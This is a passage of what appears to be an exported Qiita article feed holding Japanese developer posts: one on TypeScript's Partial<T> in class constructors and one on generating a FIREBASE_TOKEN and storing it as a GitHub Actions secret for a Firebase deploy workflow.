Partial\\<T>を使用しない例\n以下のクラスを作成したとします。\n各プロパティは`?`でオプション指定をしており、インスタンス化する際に値指定は必須でないように定義しました。\n\nインスタンス化は以下の2通りで行いました。\n* `const record = new Record(\"1\", \"タイトル\", 1, \"2025-04-06\");`\n →全てのプロパティに値を指定してインスタンス化\n* `const recordUndefined = new Record(undefined, \"タイトル\", 1, \"2025-04-06\");`\n →id以外のプロパティに値を指定してインスタンス化\n```ts:record.ts\nexport class Record {\n  constructor(\n    public id?: string,\n    public title?: string,\n    public time?: number,\n    public created_at?: string\n  ) {}\n}\n\n// 全てのプロパティに値を指定して、インスタンス化\nconst record = new Record(\"1\", \"タイトル\", 1, \"2025-04-06\");\nconsole.log(record);\n// id以外の値を指定して、インスタンス化\nconst recordUndefined = new Record(undefined, \"タイトル\", 1, \"2025-04-06\");\nconsole.log(recordUndefined);\n```\n実行結果は下記の通りになります。\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/b8ae0f46-e816-4134-b157-24549645c19c.png)\n\n**定義不要のプロパティでも、明示的に`undefined`を指定しなければいけません**\nプロパティの数が増えたときは非常に面倒になりそうです。\n\n# Partial\\<T>を使用した例\n* class内で各プロパティを定義します\n* コンストラクタの引数には`変数: init`、`型: Partial<T>`を指定します\n* `Object.assign(this, init);`でinitオブジェクトのプロパティをthis（クラスインスタンス）にコピーします\n* タイトルのみ指定して、インスタンス化しました\n\n```ts:record.ts\nexport class PartialRecord {\n  public id?: string;\n  public title?: string;\n  public time?: number;\n  public created_at?: string;\n\n  constructor(init: Partial<PartialRecord>) {\n    Object.assign(this, init);\n  }\n}\n\n// titleのみ指定して、インスタンス化\nconst partialRecord = new PartialRecord({ title: \"a\" });\nconsole.log(partialRecord);\n```\n実行結果は下記の通りです。\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/c294bbe2-5f71-4c55-87d7-71f8d6cd74e9.png)\n\n**タイトル以外のプロパティは明示的に`undefined`を指定せずともインスタンス化できました**\nこれが、Partial\\<T>を使用する最大のメリットだと思います。\n\n# おわりに\n`Partial<T>`の他に全プロパティを必須にする`Required<T>`もあることを関連資料から学びました。\n\n# 参考\n\nhttps://qiita.com/Tsuyoshi84/items/e74109e2ccc0f4e625aa\n\nhttps://typescriptbook.jp/reference/type-reuse/utility-types/partial\n\nhttps://typescriptbook.jp/tips/shallow-copy-object#%E6%B5%85%E3%81%84%E3%82%B3%E3%83%94%E3%83%BC%E3%82%92%E5%AE%9F%E8%A3%85%E3%81%99%E3%82%8B\n\nhttps://typescriptbook.jp/reference/type-reuse/utility-types/required\n\nhttps://typescriptbook.jp/reference/type-reuse/utility-types\n","coediting":false,"comments_count":0,"created_at":"2025-04-06T18:19:13+09:00","group":null,"id":"8e1389a050426832c83e","likes_count":0,"private":true,"reactions_count":0,"stocks_count":0,"tags":[{"name":"TypeScript","versions":[]},{"name":"型","versions":[]}],"title":"【TypeScript】Partial<T>とは、class定義で使うメリット","updated_at":"2025-04-06T18:19:13+09:00","url":"https://qiita.com/asa129/private/8e1389a050426832c83e","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":28,"team_membership":null,"organization_url_name":null,"slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-3:72\">GitHubActionsでFirebaseのデプロイフローを作成中、FIREBASE_TOKENの設定方法を忘れていました。<br>\n今後もスムーズにできるよう備忘録として残します。</p>\n<h1 data-sourcepos=\"5:1-5:32\">\n<span id=\"作成したワークフロー\" class=\"fragment\"></span><a href=\"#%E4%BD%9C%E6%88%90%E3%81%97%E3%81%9F%E3%83%AF%E3%83%BC%E3%82%AF%E3%83%95%E3%83%AD%E3%83%BC\"><i class=\"fa fa-link\"></i></a>作成したワークフロー</h1>\n<p data-sourcepos=\"6:1-6:86\">最後の行に記載の<code>secrets.FIREBASE_TOKEN</code>の取得と、設定を行います</p>\n<div class=\"code-frame\" data-lang=\"yml\" data-sourcepos=\"8:1-72:3\">\n<div class=\"code-lang\"><span class=\"bold\">main.yml</span></div>\n<div class=\"highlight\"><pre><code><span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">CiCd</span>\n\n<span class=\"na\">on</span><span class=\"pi\">:</span> <span class=\"s\">push</span>\n\n<span class=\"na\">jobs</span><span class=\"pi\">:</span>\n  <span class=\"na\">build</span><span class=\"pi\">:</span>\n    <span class=\"na\">runs-on</span><span class=\"pi\">:</span> <span class=\"s\">ubuntu-latest</span>\n    <span class=\"na\">steps</span><span class=\"pi\">:</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Checkout code</span>\n        <span class=\"na\">uses</span><span class=\"pi\">:</span> <span class=\"s\">actions/checkout@v2</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Setup Node.js</span>\n        <span class=\"na\">uses</span><span class=\"pi\">:</span> <span class=\"s\">actions/setup-node@v2</span>\n        <span class=\"na\">with</span><span class=\"pi\">:</span>\n          <span class=\"na\">node-version</span><span class=\"pi\">:</span> <span class=\"s2\">\"</span><span class=\"s\">20\"</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Install dependencies</span>\n        <span class=\"na\">run</span><span class=\"pi\">:</span> <span class=\"s\">npm install</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Run build</span>\n        <span class=\"na\">run</span><span class=\"pi\">:</span> <span class=\"s\">npm run build</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Archive Production Artifact</span>\n        <span class=\"na\">uses</span><span class=\"pi\">:</span> <span class=\"s\">actions/upload-artifact@v4</span>\n        <span class=\"na\">with</span><span class=\"pi\">:</span>\n          <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">dist</span>\n          <span class=\"na\">path</span><span class=\"pi\">:</span> <span class=\"s\">dist</span>\n\n  <span class=\"na\">test</span><span class=\"pi\">:</span>\n    <span class=\"na\">runs-on</span><span class=\"pi\">:</span> <span class=\"s\">ubuntu-latest</span>\n    <span class=\"na\">steps</span><span class=\"pi\">:</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Checkout code</span>\n        <span class=\"na\">uses</span><span class=\"pi\">:</span> <span class=\"s\">actions/checkout@v2</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Setup Node.js</span>\n        <span class=\"na\">uses</span><span class=\"pi\">:</span> <span class=\"s\">actions/setup-node@v2</span>\n        <span class=\"na\">with</span><span class=\"pi\">:</span>\n          <span class=\"na\">node-version</span><span class=\"pi\">:</span> <span class=\"s2\">\"</span><span class=\"s\">20\"</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Install dependencies</span>\n        <span class=\"na\">run</span><span class=\"pi\">:</span> <span class=\"s\">npm install</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Run test</span>\n        <span class=\"na\">run</span><span class=\"pi\">:</span> <span class=\"s\">npm run test</span>\n\n  <span class=\"na\">deploy</span><span class=\"pi\">:</span>\n    <span class=\"na\">runs-on</span><span class=\"pi\">:</span> <span class=\"s\">ubuntu-latest</span>\n    <span class=\"na\">needs</span><span class=\"pi\">:</span> <span class=\"s\">build</span> <span class=\"c1\"># buildジョブが完了してから実行</span>\n    <span class=\"na\">steps</span><span class=\"pi\">:</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Checkout code</span>\n        <span class=\"na\">uses</span><span class=\"pi\">:</span> <span class=\"s\">actions/checkout@v2</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Setup Node.js</span>\n        <span class=\"na\">uses</span><span class=\"pi\">:</span> <span class=\"s\">actions/setup-node@v2</span>\n        <span class=\"na\">with</span><span class=\"pi\">:</span>\n          <span class=\"na\">node-version</span><span class=\"pi\">:</span> <span class=\"s2\">\"</span><span class=\"s\">20\"</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Install dependencies</span>\n        <span class=\"na\">run</span><span class=\"pi\">:</span> <span class=\"s\">npm install</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Download Artifact</span>\n        <span class=\"na\">uses</span><span class=\"pi\">:</span> <span class=\"s\">actions/download-artifact@v4</span>\n        <span class=\"na\">with</span><span class=\"pi\">:</span>\n          <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">dist</span>\n          <span class=\"na\">path</span><span class=\"pi\">:</span> <span class=\"s\">dist</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Deploy to Firebase</span>\n        <span class=\"na\">uses</span><span class=\"pi\">:</span> <span class=\"s\">joinflux/firebase-tools@v9.16.0</span>\n        <span class=\"na\">with</span><span class=\"pi\">:</span>\n          <span class=\"na\">args</span><span class=\"pi\">:</span> <span class=\"s\">deploy --project=new-study-record --only hosting</span>\n        <span class=\"na\">env</span><span class=\"pi\">:</span>\n          <span class=\"na\">FIREBASE_TOKEN</span><span class=\"pi\">:</span> <span class=\"s\">${{ secrets.FIREBASE_TOKEN }}</span>\n\n\n</code></pre></div>\n</div>\n<h1 data-sourcepos=\"74:1-74:25\">\n<span id=\"firebase_tokenの作成\" class=\"fragment\"></span><a href=\"#firebase_token%E3%81%AE%E4%BD%9C%E6%88%90\"><i class=\"fa fa-link\"></i></a>FIREBASE_TOKENの作成</h1>\n<ul data-sourcepos=\"75:1-76:0\">\n<li data-sourcepos=\"75:1-76:0\">FIREBASE_TOKENを作成する</li>\n</ul>\n<div class=\"code-frame\" data-lang=\"shell\" data-sourcepos=\"77:1-83:3\"><div class=\"highlight\"><pre><code><span class=\"c\"># Firebase CLIにログインする</span>\n<span class=\"nv\">$ </span>firebase login\n\n<span class=\"c\"># CIサービス用のトークンを生成する</span>\n<span class=\"nv\">$ </span>firebase login:ci\n</code></pre></div></div>\n<ul data-sourcepos=\"85:1-87:0\">\n<li data-sourcepos=\"85:1-87:0\">\n<code>firebase login:ci</code> を実行すると、「コマンドラインは非インタラクティブモードで実行されています」という警告が表示されます。<br>\n表示されたURLをクリックして、ブラウザでの認証に進みます。この画面では、赤枠で囲まれたURLが認証ページへのリンクです</li>\n</ul>\n<p data-sourcepos=\"88:1-88:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F50f057c2-ca3b-43a3-bf14-28b9a7572785.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=e7d13b99240df5944976dd87740738ce\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F50f057c2-ca3b-43a3-bf14-28b9a7572785.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=e7d13b99240df5944976dd87740738ce\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F50f057c2-ca3b-43a3-bf14-28b9a7572785.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=7978213f554fdf89f02a1f7c64802e2c 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/50f057c2-ca3b-43a3-bf14-28b9a7572785.png\" loading=\"lazy\"></a></p>\n<ul data-sourcepos=\"90:1-91:0\">\n<li data-sourcepos=\"90:1-91:0\">Googleアカウントにログイン、リクエストの許可を行う</li>\n</ul>\n<p data-sourcepos=\"92:1-92:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F4224294f-2668-47e5-84a4-167423dbecd4.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=c4cc257f23209c71a9d1eb7bf04f42a5\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F4224294f-2668-47e5-84a4-167423dbecd4.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=c4cc257f23209c71a9d1eb7bf04f42a5\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F4224294f-2668-47e5-84a4-167423dbecd4.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=180ea646a39c1e2cbd16da2ec7b34d59 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/4224294f-2668-47e5-84a4-167423dbecd4.png\" loading=\"lazy\"></a></p>\n<ul data-sourcepos=\"94:1-96:0\">\n<li data-sourcepos=\"94:1-96:0\">トークンが生成されるので、コピーする<br>\n<strong>この時、トークンはターミナルに直接表示されます。秘密情報として取り扱ってください。</strong>\n</li>\n</ul>\n<p data-sourcepos=\"97:1-97:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F26089c8f-1696-4986-ac03-96a3c1255334.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=2942b57a0336b62a8fa651fba57df578\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F26089c8f-1696-4986-ac03-96a3c1255334.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=2942b57a0336b62a8fa651fba57df578\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F26089c8f-1696-4986-ac03-96a3c1255334.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=9a61a35c1d007b361a5b0ff56a4b7428 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/26089c8f-1696-4986-ac03-96a3c1255334.png\" loading=\"lazy\"></a></p>\n<h1 data-sourcepos=\"100:1-100:34\">\n<span id=\"githubへfirebase_tokenを登録\" class=\"fragment\"></span><a href=\"#github%E3%81%B8firebase_token%E3%82%92%E7%99%BB%E9%8C%B2\"><i class=\"fa fa-link\"></i></a>GitHubへFIREBASE_TOKENを登録</h1>\n<ul data-sourcepos=\"102:1-107:0\">\n<li data-sourcepos=\"102:1-107:0\">GitHubのリポジトリページから<br>\n<code>Settings</code>→<code>Secrets and variables</code>→<code>Actions</code>を選択<br>\n<code>New repository secret</code>押下</li>\n</ul>\n<p data-sourcepos=\"108:1-108:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F3f8ab7b2-056f-48f0-ae09-7373aa800d5b.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=3a7439e4997a60072805aa36758a4029\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F3f8ab7b2-056f-48f0-ae09-7373aa800d5b.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=3a7439e4997a60072805aa36758a4029\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F3f8ab7b2-056f-48f0-ae09-7373aa800d5b.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=552c168107b1057bc2bafecb045ffe0c 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/3f8ab7b2-056f-48f0-ae09-7373aa800d5b.png\" loading=\"lazy\"></a></p>\n<ul data-sourcepos=\"110:1-113:0\">\n<li data-sourcepos=\"110:1-113:0\">FIREBASE_TOKENを登録する<br>\nName:<code>FIREBASE_TOKEN</code><br>\nSecret: <code>コピーしたシークレットキー</code>\n</li>\n</ul>\n<p data-sourcepos=\"114:1-114:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fe3536205-01a8-4b6b-b65a-20f2ab7d8db2.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=abdfc6638295bd5d77f0de2b8044e21a\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fe3536205-01a8-4b6b-b65a-20f2ab7d8db2.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=abdfc6638295bd5d77f0de2b8044e21a\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fe3536205-01a8-4b6b-b65a-20f2ab7d8db2.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=1f250d40df2e2459be7a082e46175b4b 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/e3536205-01a8-4b6b-b65a-20f2ab7d8db2.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"116:1-116:21\"><code>Add secret</code>で追加</p>\n<p data-sourcepos=\"118:1-118:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F825f9492-2ab6-43f9-b6fc-c86cd520d9d2.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=def6b5f65d2e2bf4ab12935f909549d1\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F825f9492-2ab6-43f9-b6fc-c86cd520d9d2.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=def6b5f65d2e2bf4ab12935f909549d1\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F825f9492-2ab6-43f9-b6fc-c86cd520d9d2.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=4051d098538a3c455c1c349eb24d7f7f 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/825f9492-2ab6-43f9-b6fc-c86cd520d9d2.png\" loading=\"lazy\"></a></p>\n<h1 data-sourcepos=\"120:1-120:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"121:1-122:87\">以前も同じ個所で調べて解決しましたが、まとめなかったため、また調べるという作業が発生してしまいました。<br>\nこまめに記事にして同じことを繰り返さないようにしたいです。</p>\n<h1 data-sourcepos=\"124:1-124:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"125:1-125:42\"><iframe id=\"qiita-embed-content__5f40fa2f8d5f54c507b6901de428506e\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__5f40fa2f8d5f54c507b6901de428506e\" data-content=\"https%3A%2F%2Fgithub.com%2Fjoinflux%2Ffirebase-tools\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\nGitHubActionsでFirebaseのデプロイフローを作成中、FIREBASE_TOKENの設定方法を忘れていました。\n今後もスムーズにできるよう備忘録として残します。\n\n# 作成したワークフロー\n最後の行に記載の` secrets.FIREBASE_TOKEN `の取得と、設定を行います\n\n```yml:main.yml\nname: CiCd\n\non: push\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v2\n      - name: Setup Node.js\n        uses: actions/setup-node@v2\n        with:\n          node-version: \"20\"\n      - name: Install dependencies\n        run: npm install\n      - name: Run build\n        run: npm run build\n      - name: Archive Production Artifact\n        uses: actions/upload-artifact@v4\n        with:\n          name: dist\n          path: dist\n\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v2\n      - name: Setup Node.js\n        uses: actions/setup-node@v2\n        with:\n          node-version: \"20\"\n      - name: Install dependencies\n        run: npm install\n      - name: Run test\n        run: npm run test\n\n  deploy:\n    runs-on: ubuntu-latest\n    needs: build # buildジョブが完了してから実行\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v2\n      - name: Setup Node.js\n        uses: actions/setup-node@v2\n        with:\n          node-version: \"20\"\n      - name: Install dependencies\n        run: npm install\n      - name: Download Artifact\n        uses: actions/download-artifact@v4\n        with:\n          name: dist\n          path: dist\n      - name: Deploy to Firebase\n        uses: joinflux/firebase-tools@v9.16.0\n        with:\n          args: deploy --project=new-study-record --only hosting\n        env:\n          FIREBASE_TOKEN: ${{ secrets.FIREBASE_TOKEN }}\n\n\n```\n\n# FIREBASE_TOKENの作成\n* FIREBASE_TOKENを作成する\n\n```shell\n# Firebase CLIにログインする\n$ firebase login\n\n# CIサービス用のトークンを生成する\n$ firebase login:ci\n```\n\n* `firebase login:ci` を実行すると、「コマンドラインは非インタラクティブモードで実行されています」という警告が表示されます。\n 表示されたURLをクリックして、ブラウザでの認証に進みます。この画面では、赤枠で囲まれたURLが認証ページへのリンクです\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/50f057c2-ca3b-43a3-bf14-28b9a7572785.png)\n\n* Googleアカウントにログイン、リクエストの許可を行う\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/4224294f-2668-47e5-84a4-167423dbecd4.png)\n\n* トークンが生成されるので、コピーする\n**この時、トークンはターミナルに直接表示されます。秘密情報として取り扱ってください。**\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/26089c8f-1696-4986-ac03-96a3c1255334.png)\n\n\n# GitHubへFIREBASE_TOKENを登録\n\n* GitHubのリポジトリページから\n`Settings`→`Secrets and variables`→`Actions`を選択\n`New repository secret`押下\n\n\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/3f8ab7b2-056f-48f0-ae09-7373aa800d5b.png)\n\n* FIREBASE_TOKENを登録する\nName:`FIREBASE_TOKEN`\nSecret: `コピーしたシークレットキー`\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/e3536205-01a8-4b6b-b65a-20f2ab7d8db2.png)\n\n`Add secret`で追加\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/825f9492-2ab6-43f9-b6fc-c86cd520d9d2.png)\n\n# おわりに\n以前も同じ個所で調べて解決しましたが、まとめなかったため、また調べるという作業が発生してしまいました。\nこまめに記事にして同じことを繰り返さないようにしたいです。\n\n# 参考\nhttps://github.com/joinflux/firebase-tools\n","coediting":false,"comments_count":0,"created_at":"2025-04-05T19:14:49+09:00","group":null,"id":"1bac1010abf11ac44b8d","likes_count":1,"private":false,"reactions_count":0,"stocks_count":1,"tags":[{"name":"Firebase","versions":[]},{"name":"GitHubActions","versions":[]}],"title":"【Firebase】FIREBASE_TOKENを作成して、GitHubActionsで使用する","updated_at":"2025-04-05T19:14:49+09:00","url":"https://qiita.com/asa129/items/1bac1010abf11ac44b8d","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":582,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-2:165\">Vite + React + TypeScriptプロジェクトを作成、GitHubに連携したところ、languageの割合のCSSが非常に高いため、修正を試みました。</p>\n<h1 data-sourcepos=\"4:1-4:8\">\n<span id=\"問題\" class=\"fragment\"></span><a href=\"#%E5%95%8F%E9%A1%8C\"><i class=\"fa fa-link\"></i></a>問題</h1>\n<p data-sourcepos=\"5:1-5:110\">GitHubのプロジェクトが<code>CSS</code>プロジェクトとみなされている。Languagesの割合も高い。</p>\n<p data-sourcepos=\"7:1-7:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F20b2da00-e0a7-417e-925a-402e84831884.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=ac8bb55ca545708a25827c951010c28f\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F20b2da00-e0a7-417e-925a-402e84831884.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=ac8bb55ca545708a25827c951010c28f\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F20b2da00-e0a7-417e-925a-402e84831884.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=ade3e87f4d53dbb9fba114b4d669f1d5 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/20b2da00-e0a7-417e-925a-402e84831884.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"9:1-9:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F08cac5e8-eb9f-4dc3-a7da-c833f71f5ae8.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=b899921fc30be6f955b10382615c02df\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F08cac5e8-eb9f-4dc3-a7da-c833f71f5ae8.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=b899921fc30be6f955b10382615c02df\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F08cac5e8-eb9f-4dc3-a7da-c833f71f5ae8.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=289b481beb2cb3e3f81bf2bd4e50594f 1x\" 